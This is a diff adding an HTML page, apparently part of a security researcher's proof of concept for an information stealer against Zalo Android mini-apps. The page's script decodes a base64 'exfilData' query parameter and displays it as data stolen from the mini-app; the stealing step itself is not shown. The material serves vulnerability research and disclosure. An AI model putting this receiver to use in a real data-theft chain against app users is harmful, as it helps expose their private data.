@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html id="SeanP-bionicman-hmtl">
+    <!-- Author: Sean Pesce -->
+    <!-- Zalo mini-app data stealer parser -->
+    <head id="SeanP-bionicman-head">
+        <link rel="shortcut icon" id="SeanP-bionicman-head-link-favicon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABBVBMVEU/UbU/UbQ/UbY+ULI/ULM+T7BAUrc+ULM7TKg+T7E8Tq0/ULQ9T687Tao/Urc+ULQ6SqQ4SJ5CVLxCVb5DVr9CVL0dJlQoNHRBVLtEV8I8Taw/UrZEV8M6SqYkL2kfJ1gSFzQAAAAKDRwYHkMmMW01RJc6S6hDVsA8TasmMW4dJVMMDyEIChcuO4QJDBoAAQEBAQMEBgwcJFA6S6c0Q5UZIUkHCRMBAgQcJVEjLWUvPIYGBxAKDR0BAQIDBAk3R54OEicCAgUpNXY5SaM8Ta0cJE8FBg0TGTYVGzszQZExP4wXHkMZIUhAU7k9T7A2RpxDVsFBVLwuO4I4SKFBU7tBU7r///9e5KOYAAAAAWJLR0RWCg3piQAAAAd0SU1FB+cGHgwIFs0EkqsAAAC6SURBVBjTY2BAAEYmZhYkLhMrIxs7BxOSACcXNw8vHwM/OyNMRECQh5GdQUiYjZ2ZEaSSkZGRTUSUQUycU0KSQUqagZ1NRkpWTp5BQVFJWUVVTZpBXUNTS1tHgUFXT1HfwNDI2MTUTFHR3MKSgdnK2sZW0U7W3sFR0VHRyZnBRc3Vzd3DU0Lay9vDzEfGl4HRz8+fPSCQTTYogD3YjwHoBibpECZ2dgY2CWamUGmIi7jBJDsDIzcDWQAAiSYStruNAvgAAAAldEVYdGRhdGU6Y3JlYXRlADIwMjMtMDYtMzBUMTI6MDg6MjIrMDA6MDDAnJm4AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDIzLTA2LTMwVDEyOjA4OjIyKzAwOjAwscEhBAAAACh0RVh0ZGF0ZTp0aW1lc3RhbXAAMjAyMy0wNi0zMFQxMjowODoyMiswMDowMObUANsAAAAASUVORK5CYII=">
+        <title id="SeanP-bionicman-head-title">Zalo Android Proof of Concept | SeanP</title>
+        <style id="SeanP-bionicman-head-style">
+body {
+    font: normal 11px Verdana, Arial, sans-serif;
+    padding: 20px;
+}
+pre {
+    background-color: rgb(230, 230, 230);
+    padding: 5px;
+    overflow-x: auto;
+}
+        </style>
+    </head>
+    <body id="SeanP-bionicman-body">
+        <h2 id="SeanP-bionicman-body-h2-title">Zalo Info Stealer Proof of Concept by Sean Pesce</h2>
+        <p></p>
+        <h3 id="SeanP-bionicman-lbl-exfil-data">Data stolen from Zalo Mini App:</h3>
+        <div><pre id="SeanP-bionicman-pre-exfil-output"> </pre></div>
+        <p></p>
+        <div id="SeanP-bionicman-body-div-errors" style="visibility: hidden">
+            <h3 id="SeanP-bionicman-body-div-h3-lbl-errors">Errors</h3>
+            <pre id="SeanP-bionicman-body-div-pre-data-errors" style="background-color: rgb(243, 228, 228);"> </pre>
+        </div>
+        <h3 id="SeanP-bionicman-body-h3-lbl-other-resources">Other Resources</h3>
+        <br id="SeanP-bionicman-body-br-other-resources-1">
+        <a id="SeanP-bionicman-body-a-Sean-Pesce-website" href="https://SeanPesce.github.io/">Sean Pesce's homepage</a>
+
+        <!-- Zalo Mini-app stuff -->
+        <div id="app"></div>
+        <!-- built script files will be auto injected -->
+        
+    </body>
+    <footer id="SeanP-bionicman-footer">
+        <script id="SeanP-bionicman-footer-script">
+
+try {
+// Constants & globals
+var WEBVIEW_ANALYZER_DOM_ID_PREFIX = 'SeanP-bionicman-';
+
+// Utility functions
+function webViewAnalyzerHtmlEscape(str) {
+    if (str == null) {
+        str = '';
+    }
+    return str.replace(/&/g, '&amp;').replace(/'/g, '&apos;').replace(/"/g, '&quot;').replace(/>/g, '&gt;').replace(/</g, '&lt;');
+}
+
+
+
+function setWebViewAnalysisData(idSuffix, data) {
+    if (data == null) {
+        data = '';
+    }
+    if (data === '') {
+        data = ' '; // Make sure code block has non-zero height (for aesthetic purposes)
+    }
+    var el = document.getElementById(WEBVIEW_ANALYZER_DOM_ID_PREFIX+idSuffix);
+    data = webViewAnalyzerHtmlEscape(data);
+    el.innerHTML = data;
+}
+
+function webViewAnalyzerDisplayError(err) {
+    try {
+        document.getElementById(WEBVIEW_ANALYZER_DOM_ID_PREFIX+'body-div-errors').style.visibility = 'visible';
+        setWebViewAnalysisData('body-div-pre-data-errors', err.toString());
+    } catch (err2) {
+        alert(err);
+    }
+}
+
+
+function getQueryParam(param) {
+    var queryString = window.location.search;
+    var urlParams = new URLSearchParams(queryString);
+    var paramVal = urlParams.get(''+param);
+    return paramVal;
+}
+
+var exfilData = getQueryParam('exfilData');
+if (exfilData != null && exfilData != '') {
+    exfilData = atob(exfilData);
+    exfilData = decodeURIComponent(exfilData);
+    exfilData = JSON.parse(exfilData);
+    exfilData = JSON.stringify(exfilData, null, 2);
+    setWebViewAnalysisData('pre-exfil-output', exfilData);
+} else {
+    alert('Failed to exfiltrate data.');
+}
+
+} catch (err) {
+    // Catch and display all errors
+    alert(err);
+}
+        </script>
+    </footer>
+</html>
